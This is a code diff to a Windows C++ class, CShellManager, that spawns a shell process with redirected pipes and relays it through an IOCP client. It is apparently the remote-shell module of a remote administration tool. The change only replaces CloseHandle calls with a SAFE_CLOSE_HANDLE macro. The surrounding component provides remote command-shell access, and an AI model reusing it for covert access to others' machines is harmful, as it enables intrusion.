@@ -29,11 +29,11 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n, void* user):CManag
     //创建管道
     if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0)) {
         if(m_hReadPipeHandle != NULL) {
-            CloseHandle(m_hReadPipeHandle);
+            SAFE_CLOSE_HANDLE(m_hReadPipeHandle);
             m_hReadPipeHandle = NULL;
         }
         if(m_hWritePipeShell != NULL) {
-            CloseHandle(m_hWritePipeShell);
+            SAFE_CLOSE_HANDLE(m_hWritePipeShell);
             m_hWritePipeShell = NULL;
         }
         return;
@@ -41,11 +41,11 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n, void* user):CManag
 
     if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) {
         if(m_hWritePipeHandle != NULL) {
-            CloseHandle(m_hWritePipeHandle);
+            SAFE_CLOSE_HANDLE(m_hWritePipeHandle);
             m_hWritePipeHandle = NULL;
         }
         if(m_hReadPipeShell != NULL) {
-            CloseHandle(m_hReadPipeShell);
+            SAFE_CLOSE_HANDLE(m_hReadPipeShell);
             m_hReadPipeShell = NULL;
         }
         return;
@@ -79,13 +79,13 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n, void* user):CManag
 
     if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE,
                        NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
-        CloseHandle(m_hReadPipeHandle);
+        SAFE_CLOSE_HANDLE(m_hReadPipeHandle);
         m_hReadPipeHandle = NULL;
-        CloseHandle(m_hWritePipeHandle);
+        SAFE_CLOSE_HANDLE(m_hWritePipeHandle);
         m_hWritePipeHandle = NULL;
-        CloseHandle(m_hReadPipeShell);
+        SAFE_CLOSE_HANDLE(m_hReadPipeShell);
         m_hReadPipeShell = NULL;
-        CloseHandle(m_hWritePipeShell);
+        SAFE_CLOSE_HANDLE(m_hWritePipeShell);
         m_hWritePipeShell = NULL;
         return;
     }
@@ -132,7 +132,7 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lParam)
             LocalFree(szTotalBuffer);
         }
     }
-    CloseHandle(This->m_hThreadRead);
+    SAFE_CLOSE_HANDLE(This->m_hThreadRead);
     This->m_hThreadRead = NULL;
     Mprintf("ReadPipe线程退出\n");
     return 0;
@@ -164,22 +164,22 @@ CShellManager::~CShellManager()
 
     if (m_hReadPipeHandle != NULL) {
         DisconnectNamedPipe(m_hReadPipeHandle);
-        CloseHandle(m_hReadPipeHandle);
+        SAFE_CLOSE_HANDLE(m_hReadPipeHandle);
         m_hReadPipeHandle = NULL;
     }
     if (m_hWritePipeHandle != NULL) {
         DisconnectNamedPipe(m_hWritePipeHandle);
-        CloseHandle(m_hWritePipeHandle);
+        SAFE_CLOSE_HANDLE(m_hWritePipeHandle);
         m_hWritePipeHandle = NULL;
     }
     if (m_hReadPipeShell != NULL) {
         DisconnectNamedPipe(m_hReadPipeShell);
-        CloseHandle(m_hReadPipeShell);
+        SAFE_CLOSE_HANDLE(m_hReadPipeShell);
         m_hReadPipeShell = NULL;
     }
     if (m_hWritePipeShell != NULL) {
         DisconnectNamedPipe(m_hWritePipeShell);
-        CloseHandle(m_hWritePipeShell);
+        SAFE_CLOSE_HANDLE(m_hWritePipeShell);
         m_hWritePipeShell = NULL;
     }
     while (m_hThreadRead) {
